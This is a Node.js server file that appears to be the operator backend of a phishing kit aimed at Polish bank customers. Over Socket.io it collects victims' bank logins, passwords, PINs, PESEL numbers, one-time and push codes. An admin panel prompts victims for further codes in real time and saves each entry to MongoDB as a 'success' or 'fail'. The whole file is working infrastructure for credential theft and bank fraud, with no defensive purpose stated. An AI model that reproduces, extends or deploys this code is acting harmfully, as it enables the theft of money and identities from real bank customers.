const _PORT = 3301;
//utils
const findUserIndex = require("./backend/utils/findUserIndex");
const findUser = require("./backend/utils/findUser");
const path = require('path');
const session = require('express-session');

const cors = require('cors');
const whitelist = ['https://black.poladmin.pp.ua', 'https://poladmin.pp.ua'];
// console.log(process.env);
// if(process.env.NODE_ENV === 'development'){
//     whitelist.push('http://localhost:3000');
//     whitelist.push('http://localhost:3001');
// }
const corsOptions = {
    origin: function (origin, callback) {
        if (whitelist.indexOf(origin) !== -1) {
            callback(null, true)
        } else {
            console.log(origin, 'blocked');
            callback('Its close api');
        }
    },
    methods: ['GET', 'POST'],
    credentials: true
}

// express
const express = require('express');
const app = express();
app.use(cors(corsOptions));
app.use(session({
    secret: 'hello world',
    resave: true,
}))


app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

//http server
const server= require('http').createServer(app);

//MongoDB
const mongoose = require('mongoose');
const Users = require("./backend/models/user");
const Admin = require("./backend/models/admin");

mongoose.connect('\'mongodb://localhost:27017/users',{
    useNewUrlParser: true, useUnifiedTopology: true
});
const db = mongoose.connection;
db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', function() { console.log('DB connected')});

//Variables
let users = [];

// Socket
const io = require('socket.io')(server, {
    cors: {
        origin: function (origin, callback) {
            if (whitelist.indexOf(origin) !== -1) {
                callback(null, true)
            } else {
                console.log(origin, 'blocked');
                callback('Its close api');
            }
        },
        methods: ["GET", "POST"],
        transports: ['websocket', 'polling'],
        credentials: true,
    }
})
io.on('connection', (socket) => {

    console.log('Connection');
    //User actions
    socket.on('init_user', (data) => {
        console.log('Hook init user', data);
        const userIndex = findUserIndex(data.id, users);
        if (userIndex >= 0) {
            users[userIndex] = {
                ...data
            }
        }
        else {
            users.push({
                ...data,
            });
        }
        socket.join(data.id);
        socket.emit('update_user', {
            id: data.id,
            status: data.status
        });
        io.emit('update_users', users);
    });
    socket.on('get_user', (id, callback) => {
        console.log('Hook get user',id);
        const user =  findUser(id, users);
        socket.join(id);
        callback( user );
    });
    socket.on('send_code', (data) => {
        console.log('Hook send_code');
        const user = findUser(data.id, users);

        if(user) {
            console.log(user, data);
            user.status = 'send_code';
            user.code = data.code;
            console.log(user);

            socket.emit('update_user', {
                id: data.id, status: 'send_code'
            });
            io.emit('update_users', users);
        }
        // const index =  users.findIndex((item) => {
        //     return item.id === data.id
        // });
        // users[index].status = 'send_code';
        // users[index].code = data.code;
        // io.emit('update_users', users);
    });
    socket.on('send_other_data', (data, id) => {
        console.log('Hook, send_other_data');
        const userIndex = findUserIndex(id, users);
        if (userIndex >= 0) {
            users[userIndex] = {
                ...users[userIndex],
                ...data,
                status: 'send_other_data',
            }
            socket.to(id).emit('update_user', {
                id, status: 'send_other_data'
            })
            io.emit('update_users', users);
        }
    });
    socket.on('send_push', ({id, code}) => {
        console.log('Hook send_push', id, code);
        const user = findUser(id, users);

        if(user) {
            user.status = 'send_push';
            user.code = code;
            socket.to(id).emit('update_user', {
                id, status: 'send_push'
            })
            io.emit('update_users', users);
        }
    })
    //Admin actions
    socket.on('get_all_users', (callback)=>{
        console.log('Hook get_all_users');
        callback(users);
    });
    socket.on('fail_user', (id) => {
        console.log('Hook, fail_user');
        console.log(id);
        const user = findUser(id, users);
        if (user) {
            user.status = 'fail_user';
            const newUser = new Users({
                userID: user.id,
                login: user.login,
                password: user.pass,
                bank: user.bank,
                pin_code: user.pin,
                pesel: user.pesel,
                secret: user.lastname,
                amount: user.amount,
                isSuccess: false
            });
            newUser.save(function(err,user){
                if(err){
                    return console.error(err);
                }
            });
            socket.to(id).emit('update_user', {
                id, status: 'fail_user'
            })
            io.emit('update_users', users);

        }
    })
    socket.on('success_user', (id) => {
        console.log('Hook, success_user');
        const user = findUser(id, users);
        if (user) {
            user.status = 'success_user';
            const newUser = new Users({
                userID: user.id,
                login: user.login,
                password: user.pass,
                bank: user.bank,
                pin_code: user.pin,
                pesel: user.pesel,
                secret: user.lastname,
                amount: user.amount,
                isSuccess: true
            });
            newUser.save(function(err,user){
                if(err){
                    return console.error(err);
                }
            });
            socket.to(id).emit('update_user', {
                id, status: 'success_user'
            })
            io.emit('update_users', users);

        }
    })
    socket.on('delete_user', (id) => {
        console.log('Hook, delete_user');
        const userIndex = findUserIndex(id, users);
        if(userIndex >= 0){
            users.splice(userIndex, 1);
            socket.to(id).emit('update_user', {
                status: ''
            })
            io.emit('update_users', users);
        }

    })

    //Update user hook
    socket.on('update_user', ({status, id, args}) => {
        console.log('Hook, update_user');
        const userIndex = findUserIndex(id, users);
        if (userIndex >= 0){
            console.log(`Change status: ${users[userIndex].status} => ${status}`)
            users[userIndex] = {
                ...users[userIndex],
                ...args,
                status
            }
            socket.to(id).emit('update_user', {
                status, ...args, id
            });
            io.emit('update_users', users);
        }

    } )
    socket.on('send_data', ({status, id, args}) => {
        console.log('Hook, send_data');
        const userIndex = findUserIndex(id, users);
        if (userIndex >= 0){
            users[userIndex] = {
                ...users[userIndex],
                ...args,
                status
            }
            socket.emit('update_user', {
                status, ...args, id
            });
            io.emit('update_users', users);
        }

    } )

    //Disconnect socket
    socket.on("disconnect", (reason) => {
        console.log(reason);
    });
})


//Server router
app.post('/auth', (req, res) => {
    if (!req.session.user) {
        console.log("Session not set-up yet")
        if (!req.headers.authorization) {
            console.log("No auth headers")
            res.setHeader("WWW-Authenticate", "Basic")
            res.sendStatus(401)
        } else {
            const auth_stuff = new Buffer.from(req.headers.authorization.split(" ")[1], 'base64')
            const step1 = auth_stuff.toString().split(":")
            console.log("Step1: ", step1);

            Admin.findOne({username: step1[0] }, function (err, admin){
                if (err) throw err
                console.log(admin);
                if(admin){
                    admin.comparePassword(step1[1], function (err, isMatch){
                        if (err) throw err;
                        console.log('GENUINE USER', isMatch)
                        if(isMatch){
                            req.session.user = step1[0];
                            res.sendStatus(202);
                        }
                        else {
                            // res.setHeader("WWW-Authenticate", "Basic")
                            res.sendStatus(401)
                        }
                    })
                }
                else{
                    // res.setHeader("WWW-Authenticate", "Basic")
                    res.sendStatus(401)
                }

            })

        }
    }
});
app.get('/auth/check', (req, res) => {
    console.log('check', req.session.user);
    if(req.session.user){
        res.sendStatus(202);
    }
    else {
        res.sendStatus(401);
    }
})
app.get('/test', (req, res) => {
    console.log('Test request');
    res.send( `Test request ${req.method}`)
})
app.get('/get_users', async (req, res) => {
    console.log('Getting users list');

    if(req.session.user){
        const users = await Users.find( function(err, users){
            if(err){
                return console.error(err);
            }
            console.log('Users',users);
            return users;
        });
        res.json(users);
    }
    else{
        res.sendStatus(401);
    }


});
app.post('/get_users', async (req, res) => {
    console.log('Getting users list with filter');
    if(req.session.user){
        const {filter} = req.body;
        console.log(filter);
        const users = await Users.find(filter, function (err, users){
            if (err) return console.error(err);
            console.log('Users',users);
            return users;
        })
        res.json(await users);
    }
    else{
        res.sendStatus(401);
    }


})

server.listen(_PORT, ()=> {
    console.log(`Server listen port ${_PORT}`);
})
